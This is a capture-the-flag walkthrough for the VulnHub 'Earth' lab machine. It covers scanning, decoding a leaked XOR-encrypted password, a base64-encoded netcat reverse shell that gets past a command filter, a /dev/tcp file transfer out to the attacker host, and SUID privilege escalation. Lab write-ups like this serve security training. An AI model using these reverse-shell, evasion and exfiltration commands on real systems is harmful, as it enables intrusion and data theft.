
>[!hint] Source
> You can find it [here](https://www.vulnhub.com/entry/the-planets-earth,755/)

___

# Scanning

>[!danger] Command
>```bash
>nmap -A -sV 10.38.1.115

>[!success] Output
>```bash
>PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_http-title: Bad Request (400)
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_http-title: Test Page for the HTTP Server on Fedora
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
>
>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
>Nmap done: 1 IP address (1 host up) scanned in 79.88 seconds

>[!warning] Notes
>- We find that port `443` is opened, which is for `ssl` connexion[¹](https://en.wikipedia.org/wiki/Transport_Layer_Security#SSL_1.0,_2.0,_and_3.0) 
>- We find two domains named `earth.local` and `terratest.earth.local`, accessible via `https` connection (due to `ssl`)

>[!info] Set up a local domain
>- We edit the `/etc/hosts` file, and we put at the end the IP address followed by the domains names

## earth.local

>[!warning] Notes
>- We find what appears like an text encryption message, and we have the previous messages available
>- It is a key based encryption method

>[!success] Encrypted previous messages
> - `37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40`
>- `3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45`
>`2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a`


# Nikto

>[!danger] Command
>```bash
>nikto -host https://earth.local/


>[!success] Output
>```bash
>- Nikto v2.5.0
>---------------------------------------------------------------------------
>+ Target IP:          10.38.1.115
>+ Target Hostname:    earth.local
>+ Target Port:        80
>+ Start Time:         2023-08-02 19:05:46 (GMT2)
>---------------------------------------------------------------------------
>+ Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
>+ /: Cookie csrftoken created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
>+ /nvWQI4aW.php#: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
>+ Apache/2.4.51 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
>+ Python/3.9 appears to be outdated (current is at least 3.9.6).
>+ OpenSSL/1.1.1l appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
>+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
>+ /admin/: This might be interesting.
>+ /icons/: Directory indexing found.
>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
>+ 8768 requests: 0 error(s) and 9 item(s) reported on remote host
>+ End Time:           2023-08-02 19:06:44 (GMT2) (58 seconds)
>---------------------------------------------------------------------------
>+ 1 host(s) tested 	

>[!warning] Notes
>- We now know that there is an admin login page
>- But we have neither a username or a password


# terratest.earth.local

>[!warning] Notes
>- We find a file named `testingnotes.txt`.

>[!success] Output
>```txt
>Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.

>[!warning] Notes
>- Now we know that the algorithm is `XOR`, and we have the key stored in `testdata.txt`.
>- We have a username : `terra`

## Cyberchef[¹](https://gchq.github.io/CyberChef/)

>[!warning] Notes
>- We have to go from hexadecimal strings to plain text decrypted string.

>[!hint] Preview
>![[Screenshot_2023-08-04_23-19-46.png]]


>[!success] Output
>```bash
>earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humans...

>[!warning] Notes
>- We try to login as `terra` with `earthclimatechangebad4humans` as the password on the `/admin/login` page, and it works.

# Reverse shell 

>[!danger] Command
>On attacker machine
>```bash
>nc -lnvp 1234
>```

>[!warning] Notes
>- The use of nc isn't allowed for `terra`.
>- We will then encode it in [base64](https://en.wikipedia.org/wiki/Base64)

>[!danger] Command
>```bash
>echo "nc -e /bin/bash 10.38.1.110 1234" | base64

>[!success] Output
>```bash
>bmMgLWUgL2Jpbi9iYXNoIDEwLjM4LjEuMTEwCg==

>[!warning] Notes
>- We then just have to inject it in the command field on the website, make it run once decrypted

>[!danger] Command
>```bash
>echo "bmMgLWUgL2Jpbi9iYXNoIDEwLjM4LjEuMTEwCg==" | base64 -d | bash


>[!question] Explanations
> - `base64 -d` tells that we want to take a base64 string and traduct it in plain text
> - `bash` says that the string will be run
> - Here, `|` means `then`
> - So we decrypt the string and then execute the command

>[!danger] Command
>```bash
>python -c 'import pty; pty.spawn("/bin/bash")'

>[!question] Explanations
>- It is a bash shell spawned by python, just because it is more convenient than the original shell

## Privilege escalation

>[!danger] Command
>```bash
>find / -perm -u=s 2>/dev/null

>[!question] Explanations
>- It is a command that list files that we can run and that have root privilege (`-u=s`), called [SUID programs](https://www.linux.com/training-tutorials/what-suid-and-how-set-suid-linuxunix/)

>[!warning] Notes
>- We find a file named `/usr/bin/reset_root`
>- This file won't run and, as it is a binary, we don't have access to its content (except in assembly but no...)
>- We will then export it onto our attacker device 

>[!danger] Command
>On our attacking machine, we open a new port waiting for one specific file : 
>```bash
>nc -lvnp 5555 > reset_root
>```
>On the compromised device : 
>```bash
>cat /usr/bin/reset_root > /dev/tcp/10.38.1.110/5555

>[!danger] Command
>We then analyse its way of running
>```bash
>ltrace ./reset_root

>[!success] Output
>```bash
>puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT..)		= 38
access("/dev/shm/kHgTFI5G", 0)								= -1
access("/dev/shm/Zw7bV9U5", 0)								= -1
access("/tmp/kcM0Wewe", 0)								= -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.)	= 44
+++ exited (status 0) +++

>[!warning] Notes
>- We see that the file is fetching for three other files in the system, but because it isn't finding them, it will not run
>- We just create the three files using `touch` command, and then we reset root's password.

>[!hint] ROOT FLAG
>```txt
>Congratulations on completing Earth!
>If you have any feedback please contact me at SirFlash@protonmail.com
>[root_flag_b0da9554d29db2117b02aa8b66ec492e]


